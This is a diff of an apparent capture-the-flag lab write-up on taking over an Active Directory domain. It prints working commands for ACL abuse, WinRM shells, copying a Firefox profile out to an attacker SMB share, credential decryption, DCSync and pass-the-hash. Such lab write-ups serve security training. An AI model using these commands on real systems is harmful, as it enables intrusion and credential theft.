@@ -7,7 +7,7 @@
 - **Link**: https://www.hacksmarter.org/courses/e0f57d12-2c23-4d6a-8c55-b85010526e52
 
 ## Resolution Summary 
-Having only a username (`junior.analyst`) at our disposition, we investigated an FTP server which accepted anonymous login, allowing us to retrieve documents that mentioned an internal web portal and the default password (`Galaxy2026!`). Using our given username and the default password, we gained access to the domain. Afterwards, we abused `WriteOwner` over the  `StellarOps-Control` group to gain `GenericAll` on the group and then add ourselves to it. Next, we abused `ForceChangePassword` on the `ops.controller` user, which permitted us to gain a shell access on the DC. Furthermore, we exfiltrated the Firefox profile of the `ops.controller` user and decrypted the stored credentials, allowing us to compromise the `æstro.researcher` user. With that user, we abused `WriteDacl` over the `eng.payload` user to grant us `GenericAll` over him then reset its password. Following that, we could use `eng.payload` to read the GMSA password of the `SATLINK-SERVICE$` machine, allowing us to recover its NT hash. Finally, using these newly discovered credentials we were able to perform a DCSync and retrieve the domain admin's NTLM hash, successfully compromising the domain.
+Having only a username (`junior.analyst`) at our disposition, we investigated an FTP server which accepted anonymous login, allowing us to retrieve documents that mentioned an internal web portal and the default password (`Galaxy2026!`). Using our given username and the default password, we gained access to the domain. Afterwards, we abused `WriteOwner` over the  `StellarOps-Control` group to gain `GenericAll` on the group and then add ourselves to it. Next, we abused `ForceChangePassword` on the `ops.controller` user, which permitted us to gain a shell access on the DC. Furthermore, we exfiltrated the Firefox profile of the `ops.controller` user and decrypted the stored credentials, allowing us to compromise the `astro.researcher` user. With that user, we abused `WriteDacl` over the `eng.payload` user to grant us `GenericAll` over him then reset its password. Following that, we could use `eng.payload` to read the GMSA password of the `SATLINK-SERVICE$` machine, allowing us to recover its NT hash. Finally, using these newly discovered credentials we were able to perform a DCSync and retrieve the domain admin's NTLM hash, successfully compromising the domain.
 
 # Walkthrough
 - To begin with, we performed an Nmap scan to reveal open ports on the target. We found that an FTP and HTTP servers were available: 
@@ -62,7 +62,7 @@ nxc ldap 10.1.49.52 -u 'junior.analyst' -p 'Galaxy123!' --bloodhound --collectio
   <img src="./assets/Screenshots/8.png" />
 </p>
 
-- First, we can abuse `WriteOwner` over the `Stellarops-control` group to become the owner of the group: 
+- First, we could abuse `WriteOwner` over the `Stellarops-control` group to become the owner of the group: 
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' set owner StellarOps-Control junior.analyst
 ```
@@ -70,7 +70,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' s
   <img src="./assets/Screenshots/9.png" />
 </p>
 
-- Now that we are the owner of the group, we can grant ourselves privileges such as `GenericAll` over the group (which will allow us to add members):
+- After becoming the owner of the group, we could grant ourselves privileges such as `GenericAll` over the group (which would allow us to add members):
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' add genericAll StellarOps-Control junior.analyst
 ``` 
@@ -78,7 +78,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' a
   <img src="./assets/Screenshots/10.png" />
 </p>
 
-- Finally, we can add ourselves to the group: 
+- Finally, we could add ourselves to the group: 
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' add groupMember StellarOps-Control junior.analyst
 ```
@@ -86,7 +86,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' a
   <img src="./assets/Screenshots/11.png" />
 </p>
 
-- Now that we are part of the group, we can abuse `ForceChangePassword` over `ops.controller`:
+- Once we were part of the group, we could abuse `ForceChangePassword` over `ops.controller`:
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' set password ops.controller 'Password123!'
 ```
@@ -94,7 +94,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' s
   <img src="./assets/Screenshots/12.png" />
 </p>
 
-- Knowing that `ops.controller` is a member of the `Remote Management Users` group, we could use WinRM to gain a shell access on the DC:
+- Knowing that `ops.controller` was a member of the `Remote Management Users` group, we could use WinRM to gain a shell access on the DC:
 ```bash
 evil-winrm -i 10.1.49.52 -u ops.controller -p 'Password123!'
 ```
@@ -117,13 +117,13 @@ cat C:\Users\ops.controller\Desktop\user.txt
 smbserver.py -smb2support share /tmp/test -debug
 ```
 
-- We mount the SMB share on a new drive on the target machine: 
+- We mounted the SMB share on a new drive on the target machine: 
 ```powershell
 net use n: \\10.200.115.170\share
 ```
 
-- Finally, we copy the Firefox directory profile:
-	- It may take some time (~3 minutes)
+- We copied the Firefox directory profile:
+	- Note that it may take some time (~3 minutes)
 ```powershell
 copy C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr n:\ -Recurse
 ```
@@ -131,7 +131,7 @@ copy C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.d
   <img src="./assets/Screenshots/15.png" />
 </p>
 
-- Finally, we can decrypt the secrets and recover credentials for the `astro.researcher` user:
+- Finally, we could decrypt the secrets and recover credentials for the `astro.researcher` user:
 ```bash
 python3 firefox_decrypt.py /tmp/test/v8mn7ijj.default-esr
 ```
@@ -152,7 +152,7 @@ nxc smb 10.1.49.52 -u 'astro.researcher' -p 'Cosmos@42'
   <img src="./assets/Screenshots/17.png" />
 </p>
 
-- First, we can abuse `WriteDacl` over the `eng.payload` user to grant ourselves `genericAll` over that user:
+- First, we abused `WriteDacl` over the `eng.payload` user to grant ourselves `genericAll` over that user:
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42' add genericAll eng.payload astro.researcher
 ```
@@ -160,7 +160,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42
   <img src="./assets/Screenshots/19.png" />
 </p>
 
-- Having `genericAll` over `eng.payload`, we can change its password to fully compromise him: 
+- Having `genericAll` over `eng.payload`, we changed its password to fully compromise him: 
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42' set password eng.payload 'Password123!'
 ```
@@ -168,7 +168,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u 'astro.researcher' -p 'Cosmos@42
   <img src="./assets/Screenshots/20.png" />
 </p>
 
-- Next, we abuse `ReadGMSAPassword` to collect the NTLM hash of the computer `SATLINK-SERVICE$`:
+- Next, we abused `ReadGMSAPassword` to collect the NTLM hash of the computer `SATLINK-SERVICE$`:
 ```bash
 bloodyad -H 10.1.49.52 -d stellarcomms.local -u eng.payload -p 'Password123!' msldap gmsa
 ```
@@ -176,7 +176,7 @@ bloodyad -H 10.1.49.52 -d stellarcomms.local -u eng.payload -p 'Password123!' ms
   <img src="./assets/Screenshots/21.png" />
 </p>
 
-- Finally, we can perform a DCSync and dump NTDS.dit:
+- Finally, we performed a DCSync and dump NTDS.dit:
 	- Note that we used a dummy LM hash, as secretsdump requires the `LM:NT` format when passing a hash.
 ```bash
 secretsdump.py -just-dc stellarcomms.local/'SATLINK-SERVICE$'@10.1.49.52 -hashes aad3b435b51404eeaad3b435b51404ee:65d3076593d2f83ee9606253049ec372
@@ -185,7 +185,7 @@ secretsdump.py -just-dc stellarcomms.local/'SATLINK-SERVICE$'@10.1.49.52 -hashes
   <img src="./assets/Screenshots/22.png" />
 </p>
 
-- Using the NTLM hash of the Administrator user (which is also Domain Admin), we access a WinRM session and retrieve the last flag:
+- Using the NTLM hash of the Administrator user (which is also Domain Admin), we accessed a WinRM session and retrieve the last flag:
 ```bash
 evil-winrm -i 10.1.49.52 -u Administrator -H d3a97bfa75ebed92165ea2d67cd21002
 cat C:\Users\Administrator\Desktop\root.txt
